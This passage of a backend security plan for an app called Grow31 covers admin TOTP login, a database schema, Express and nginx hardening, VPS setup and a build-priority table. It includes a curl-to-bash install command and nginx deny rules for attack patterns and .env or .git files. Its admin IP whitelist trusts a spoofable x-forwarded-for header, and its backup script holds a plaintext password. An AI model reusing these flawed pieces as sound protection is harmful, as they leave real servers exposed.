    if (decoded.step !== 'totp') throw new Error('INVALID_STEP');

    const admin = await db.query('SELECT * FROM admins WHERE id = $1', [decoded.adminId]);
    const valid = speakeasy.totp.verify({
      secret: admin.rows[0].totp_secret,
      encoding: 'base32',
      token: totpCode,
      window: 2 // Allow 2 time steps tolerance
    });

    if (!valid) throw new Error('INVALID_TOTP');

    const adminToken = jwt.sign(
      { adminId: decoded.adminId, isAdmin: true },
      process.env.JWT_ADMIN_SECRET,
      { expiresIn: '1h' }
    );

    // Log admin login with IP and timestamp
    await db.query(`
      INSERT INTO admin_audit_logs (admin_id, action, ip_address)
      VALUES ($1, 'LOGIN', $2)
    `, [decoded.adminId, req.ip]);

    return { adminToken };
  }
}

// IP whitelist middleware for admin routes
const ipWhitelist = (req, res, next) => {
  const allowedIPs = (process.env.ADMIN_ALLOWED_IPS || '').split(',');
  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (!allowedIPs.includes(clientIP)) {
    return res.status(403).json({ error: 'IP_NOT_WHITELISTED' });
  }
  next();
};
```

---

## 9. DATABASE SCHEMA (PostgreSQL)

```sql
-- Users table
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  phone VARCHAR(15) UNIQUE NOT NULL,
  username VARCHAR(50),
  ref_code VARCHAR(100) UNIQUE NOT NULL,
  has_paid BOOLEAN DEFAULT false,
  profile_complete BOOLEAN DEFAULT false,
  coins INTEGER DEFAULT 100 CHECK (coins >= 0),
  streak INTEGER DEFAULT 0,
  current_day INTEGER DEFAULT 1 CHECK (current_day BETWEEN 1 AND 31),
  tier_num INTEGER DEFAULT 1 CHECK (tier_num BETWEEN 1 AND 31),
  tiers_owned INTEGER DEFAULT 0,
  investment DECIMAL(10,2) DEFAULT 0,
  spin_tickets INTEGER DEFAULT 0,
  spin_tokens INTEGER DEFAULT 0,
  referral_count INTEGER DEFAULT 0,
  payout_status VARCHAR(20) DEFAULT 'none',
  device_fingerprint VARCHAR(200),
  registration_ip INET,
  lang VARCHAR(5) DEFAULT 'en',
  country VARCHAR(3) DEFAULT 'IN',
  avatar_url TEXT,
  last_checkin DATE,
  checkin_streak INTEGER DEFAULT 0,
  is_banned BOOLEAN DEFAULT false,
  ban_reason TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Payments table
CREATE TABLE payments (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  razorpay_order_id VARCHAR(100) UNIQUE NOT NULL,
  razorpay_payment_id VARCHAR(100),
  amount DECIMAL(10,2) NOT NULL,
  qty INTEGER NOT NULL,
  status VARCHAR(20) DEFAULT 'pending', -- pending, verified, failed, refunded
  verified_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Task completions
CREATE TABLE task_completions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  task_key VARCHAR(100) NOT NULL,
  day INTEGER NOT NULL,
  reward INTEGER NOT NULL,
  verification_method VARCHAR(50),
  verification_details JSONB,
  completed_at TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(user_id, task_key, day) -- Prevents duplicate completions
);

-- Referrals
CREATE TABLE referrals (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  referrer_id UUID REFERENCES users(id),
  referred_id UUID REFERENCES users(id),
  referral_code VARCHAR(100),
  status VARCHAR(20) DEFAULT 'pending', -- pending, active, fraudulent
  coins_awarded INTEGER DEFAULT 0,
  activated_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(referrer_id, referred_id)
);

-- Coin transactions (complete audit trail)
CREATE TABLE coin_transactions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  amount INTEGER NOT NULL,
  type VARCHAR(30) NOT NULL, -- task, referral, spin, checkin, bonus, admin_credit, admin_debit
  description TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Spin records
CREATE TABLE spin_records (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  spin_type VARCHAR(20), -- ticket, token
  prize_coins INTEGER,
  prize_label VARCHAR(50),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Quiz attempts
CREATE TABLE quiz_attempts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  quiz_day INTEGER NOT NULL,
  score INTEGER NOT NULL,
  coins_earned INTEGER NOT NULL,
  answers JSONB,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(user_id, quiz_day)
);

-- Security logs (fraud detection)
CREATE TABLE security_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  event VARCHAR(100) NOT NULL,
  details JSONB,
  ip_address INET,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Admin audit trail
CREATE TABLE admin_audit_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  admin_id UUID REFERENCES admins(id),
  action VARCHAR(100),
  target_user_id UUID REFERENCES users(id),
  details JSONB,
  ip_address INET,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Task screenshot uploads
CREATE TABLE task_uploads (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  task_key VARCHAR(100),
  day INTEGER,
  file_url TEXT,
  file_hash VARCHAR(64), -- SHA-256 to detect duplicate submissions
  review_status VARCHAR(20) DEFAULT 'pending',
  reviewed_by UUID REFERENCES admins(id),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Indexes for performance
CREATE INDEX idx_users_phone ON users(phone);
CREATE INDEX idx_users_ref_code ON users(ref_code);
CREATE INDEX idx_task_completions_user_day ON task_completions(user_id, day);
CREATE INDEX idx_coin_transactions_user ON coin_transactions(user_id);
CREATE INDEX idx_referrals_referrer ON referrals(referrer_id);
CREATE INDEX idx_security_logs_user ON security_logs(user_id);
```

---

## 10. API SECURITY LAYER

### Express Security Setup

```javascript
// backend/app.js

const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { RedisStore } = require('rate-limit-redis');

const app = express();

// 1. Security Headers (Helmet)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://checkout.razorpay.com"],
      frameSrc: ["'self'", "https://api.razorpay.com"],
      connectSrc: ["'self'", "https://api.razorpay.com"]
    }
  },
  hsts: { maxAge: 63072000, includeSubDomains: true },
  noSniff: true,
  xssFilter: true
}));

// 2. CORS — only allow your domain
app.use(cors({
  origin: ['https://grow31.in', 'https://www.grow31.in'],
  methods: ['GET', 'POST', 'PUT'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// 3. Global Rate Limiting (100 req/15min per IP)
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  store: new RedisStore({ client: redis }),
  message: { error: 'TOO_MANY_REQUESTS' }
}));

// 4. Strict rate limits on sensitive endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // Only 5 OTP requests per 15 min per IP
  store: new RedisStore({ client: redis }),
  keyGenerator: (req) => req.body.phone || req.ip
});

app.post('/api/auth/send-otp', authLimiter);
app.post('/api/auth/verify-otp', authLimiter);

// 5. Input Validation with Zod on every route
const validatePhone = z.object({
  phone: z.string().regex(/^\d{10}$/, 'Must be 10 digits')
});

// 6. Request size limits (prevent large payload attacks)
app.use(express.json({ limit: '10kb' }));

// 7. Logging (Winston + Morgan)
app.use(morgan('combined', { stream: logger.stream }));
```

### Input Sanitization
```javascript
// backend/middleware/sanitize.js
// Run on ALL user-supplied text fields before DB insertion

const sanitizeHtml = require('sanitize-html');

const sanitizeInput = (input) => {
  if (typeof input !== 'string') return input;
  // Strip ALL HTML tags (prevents XSS)
  return sanitizeHtml(input, { allowedTags: [], allowedAttributes: {} })
    .trim()
    .slice(0, 500); // Max 500 chars for any string field
};

// Sanitize username specifically
const sanitizeUsername = (username) => {
  return username.replace(/[^a-zA-Z0-9_\s]/g, '').trim().slice(0, 30);
};
```

---

## 11. HOSTINGER VPS HARDENING

### Step-by-Step VPS Security Setup

```bash
# ══════════════════════════════════════
# STEP 1: Initial Server Setup (as root)
# ══════════════════════════════════════

# Update everything
apt update && apt upgrade -y

# Create non-root user for your app
adduser grow31admin
usermod -aG sudo grow31admin

# ══════════════════════════════════════
# STEP 2: SSH Hardening
# ══════════════════════════════════════

# Generate SSH key on YOUR local machine (not server):
# ssh-keygen -t ed25519 -C "grow31-vps"

# Copy your public key to server
ssh-copy-id grow31admin@YOUR_VPS_IP

# Now edit SSH config to disable password login
nano /etc/ssh/sshd_config
```

```
# /etc/ssh/sshd_config — EXACT SETTINGS TO USE:
Port 2222                         # Change from default 22 (attackers scan port 22)
PermitRootLogin no                # Never allow root SSH
PasswordAuthentication no         # Key-only login
PubkeyAuthentication yes
MaxAuthTries 3                    # Lock after 3 failed attempts
LoginGraceTime 20                 # 20 second window to login
AllowUsers grow31admin            # Only this user can SSH
```

```bash
# Restart SSH
systemctl restart sshd

# ══════════════════════════════════════
# STEP 3: UFW Firewall Rules
# ══════════════════════════════════════

ufw default deny incoming
ufw default allow outgoing
ufw allow 2222/tcp        # Your new SSH port
ufw allow 80/tcp          # HTTP (redirects to HTTPS)
ufw allow 443/tcp         # HTTPS
ufw enable
ufw status verbose

# ══════════════════════════════════════
# STEP 4: Fail2Ban (auto-ban attackers)
# ══════════════════════════════════════

apt install fail2ban -y
cat > /etc/fail2ban/jail.local << 'EOF'
[DEFAULT]
bantime = 3600          # Ban for 1 hour
findtime = 600          # Within 10 minutes
maxretry = 3            # After 3 failed attempts

[sshd]
enabled = true
port = 2222

[nginx-http-auth]
enabled = true

[nginx-limit-req]
enabled = true
filter = nginx-limit-req
action = iptables-multiport[name=ReqLimit, port="http,https"]
logpath = /var/log/nginx/error.log
maxretry = 10
EOF

systemctl restart fail2ban
systemctl enable fail2ban

# ══════════════════════════════════════
# STEP 5: NGINX with SSL (Let's Encrypt)
# ══════════════════════════════════════

apt install nginx certbot python3-certbot-nginx -y

# Get free SSL certificate
certbot --nginx -d grow31.in -d www.grow31.in

# NGINX config for Grow31
cat > /etc/nginx/sites-available/grow31 << 'EOF'
# Rate limiting zones
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=auth:10m rate=1r/s;

server {
    listen 80;
    server_name grow31.in www.grow31.in;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name grow31.in www.grow31.in;

    ssl_certificate /etc/letsencrypt/live/grow31.in/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/grow31.in/privkey.pem;
    
    # Strong SSL settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_stapling on;
    ssl_stapling_verify on;

    # Security Headers
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

    # Serve frontend
    root /var/www/grow31;
    index index.html;

    # Rate limit API
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Stricter limit for auth endpoints
    location /api/auth/ {
        limit_req zone=auth burst=5 nodelay;
        proxy_pass http://localhost:3000;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Block common attack patterns
    location ~* (eval\(|base64_decode|GLOBALS|REQUEST) {
        deny all;
    }

    # Block .git, .env, config files
    location ~* (\.git|\.env|\.htaccess|composer\.(json|lock)|package\.json) {
        deny all;
        return 404;
    }

    location / {
        try_files $uri $uri/ /index.html;
    }
}
EOF

ln -s /etc/nginx/sites-available/grow31 /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx

# ══════════════════════════════════════
# STEP 6: Node.js with PM2 (process manager)
# ══════════════════════════════════════

# Install Node.js 20 LTS
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
apt install nodejs -y

# Install PM2 globally
npm install -g pm2

# Run your backend
cd /var/www/grow31-backend
pm2 start server.js --name "grow31-api" --env production
pm2 startup systemd   # Auto-restart on server reboot
pm2 save

# ══════════════════════════════════════
# STEP 7: PostgreSQL Setup
# ══════════════════════════════════════

apt install postgresql postgresql-contrib -y

sudo -u postgres psql << 'SQL'
CREATE USER grow31user WITH PASSWORD 'YOUR_STRONG_DB_PASSWORD_HERE';
CREATE DATABASE grow31db OWNER grow31user;
GRANT ALL PRIVILEGES ON DATABASE grow31db TO grow31user;
-- Restrict to localhost only
REVOKE CONNECT ON DATABASE grow31db FROM PUBLIC;
SQL

# ══════════════════════════════════════
# STEP 8: Redis Setup
# ══════════════════════════════════════

apt install redis-server -y

# Secure Redis
nano /etc/redis/redis.conf
```

```
# Redis config — key security settings:
bind 127.0.0.1        # Localhost only — never expose to internet
requirepass YOUR_REDIS_PASSWORD_HERE
maxmemory 256mb
maxmemory-policy allkeys-lru
```

```bash
systemctl restart redis
systemctl enable redis

# ══════════════════════════════════════
# STEP 9: Automated Backups
# ══════════════════════════════════════

# Create daily backup script
cat > /home/grow31admin/backup.sh << 'EOF'
#!/bin/bash
DATE=$(date +%Y-%m-%d)
BACKUP_DIR="/home/grow31admin/backups"
mkdir -p $BACKUP_DIR

# Backup PostgreSQL
PGPASSWORD=YOUR_DB_PASS pg_dump -U grow31user grow31db | gzip > "$BACKUP_DIR/db_$DATE.sql.gz"

# Keep only last 30 days
find $BACKUP_DIR -name "*.gz" -mtime +30 -delete

echo "Backup completed: $DATE"
EOF

chmod +x /home/grow31admin/backup.sh

# Schedule daily backup at 3 AM
(crontab -l 2>/dev/null; echo "0 3 * * * /home/grow31admin/backup.sh") | crontab -

# ══════════════════════════════════════
# STEP 10: Monitoring
# ══════════════════════════════════════

# Install htop for resource monitoring
apt install htop -y

# PM2 monitoring
pm2 monit

# Check logs
pm2 logs grow31-api
```

---

## 12. COMPLETE BACKEND FILE STRUCTURE

```
grow31-backend/
├── .env                          # NEVER commit this
├── .env.example                  # Commit this as template
├── package.json
├── server.js                     # Entry point
├── config/
│   ├── db.js                     # PostgreSQL connection pool
│   ├── redis.js                  # Redis client
│   └── constants.js              # TASK_BANK, PRIZES, etc.
├── middleware/
│   ├── auth.js                   # JWT verification
│   ├── adminAuth.js              # Admin authentication
│   ├── rateLimiter.js            # Route-specific limiters
│   ├── sanitize.js               # Input sanitization
│   ├── ipWhitelist.js            # Admin IP restriction
│   └── deviceFingerprint.js     # Extract device info
├── routes/
│   ├── auth.js                   # OTP, login, register, refresh
│   ├── tasks.js                  # Task complete, upload proof
│   ├── spin.js                   # Spin (server picks result)
│   ├── payment.js                # Create order, verify, webhook
│   ├── referral.js               # Apply referral, list
│   ├── user.js                   # Profile, coins, history
│   ├── quiz.js                   # Quiz questions (answers hidden), submit
│   ├── checkin.js                # Daily check-in
│   ├── leaderboard.js            # Rankings
│   └── admin/
│       ├── auth.js               # Admin login + TOTP
│       ├── users.js              # View/ban/edit users
│       ├── payouts.js            # Verify payouts
│       └── rewards.js            # Manage rewards
├── services/
│   ├── otpService.js             # MSG91 OTP
│   ├── paymentService.js         # Razorpay
│   ├── spinService.js            # Server-side spin
│   ├── referralService.js        # Anti-fraud referrals
│   ├── taskService.js            # Task verification
│   ├── fraudDetection.js         # Anomaly detection
│   └── notificationService.js   # FCM push notifications
├── utils/
│   ├── logger.js                 # Winston logger
│   ├── crypto.js                 # Hashing utilities
│   └── validators.js             # Zod schemas
└── migrations/
    └── 001_initial_schema.sql    # Database setup
```

### .env Template
```env
# Database
DATABASE_URL=postgresql://grow31user:PASSWORD@localhost:5432/grow31db

# Redis
REDIS_URL=redis://:REDIS_PASSWORD@localhost:6379

# JWT
JWT_ACCESS_SECRET=GENERATE_64_CHAR_RANDOM_STRING
JWT_REFRESH_SECRET=GENERATE_DIFFERENT_64_CHAR_STRING
JWT_ADMIN_SECRET=GENERATE_ANOTHER_64_CHAR_STRING

# OTP (MSG91)
MSG91_AUTH_KEY=your_msg91_auth_key
MSG91_TEMPLATE_ID=your_template_id

# Payment (Razorpay)
RAZORPAY_KEY_ID=rzp_live_xxxxxxxxxxxx
RAZORPAY_KEY_SECRET=your_razorpay_secret
RAZORPAY_WEBHOOK_SECRET=your_webhook_secret

# App
NODE_ENV=production
PORT=3000
FRONTEND_URL=https://grow31.in
ADMIN_ALLOWED_IPS=YOUR_HOME_IP,YOUR_OFFICE_IP

# Storage (for screenshot uploads — use Cloudflare R2 or AWS S3)
STORAGE_BUCKET=grow31-uploads
STORAGE_KEY=your_access_key
STORAGE_SECRET=your_secret_key
STORAGE_ENDPOINT=https://your-bucket.r2.cloudflarestorage.com
```

---

## SUMMARY: WHAT TO BUILD FIRST (Priority Order)

| Priority | Task | Why | Time |
|----------|------|-----|------|
| 🔴 P0 | Move all data from localStorage to PostgreSQL | Everything else is pointless without this | 3 days |
| 🔴 P0 | Real OTP via MSG91 | No identity verification without it | 1 day |
| 🔴 P0 | Real Razorpay payment integration | Users are getting free access | 1 day |
| 🔴 P0 | JWT authentication on all API routes | No auth = no security | 1 day |
| 🔴 P0 | Server-side spin outcome | Spin is gameable without this | 0.5 day |
| 🟠 P1 | Admin TOTP + IP whitelist | Admin panel is publicly accessible | 1 day |
| 🟠 P1 | Referral anti-fraud (IP + device check) | Referral farming is your biggest loss | 1 day |
| 🟠 P1 | Task verification system | Tasks are all self-claimable | 2 days |
| 🟡 P2 | NGINX rate limiting + WAF | Protect from DDoS and brute force | 0.5 day |
| 🟡 P2 | VPS hardening (SSH keys, firewall, fail2ban) | Protect the server itself | 1 day |
| 🟡 P2 | XSS sanitization on all inputs | Currently admin panel is XSS-vulnerable | 0.5 day |
| 🟢 P3 | Screenshot upload verification for hard tasks | Medium-hard task proof system | 2 days |
| 🟢 P3 | Anomaly detection (ML fraud flags) | Catch sophisticated cheaters | 3 days |
| 🟢 P3 | Automated backups + monitoring | Production reliability | 1 day |

**Total estimated: ~18 days of focused backend work to be production-secure.**
